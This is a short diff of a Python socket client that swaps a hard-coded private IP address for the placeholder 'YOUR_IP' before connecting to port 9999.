@@ -3,7 +3,7 @@ import sys
 
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-host = '10.0.0.89'
+host = 'YOUR_IP'
 port = 9999
 conn = s.connect((host, port))
 request = True
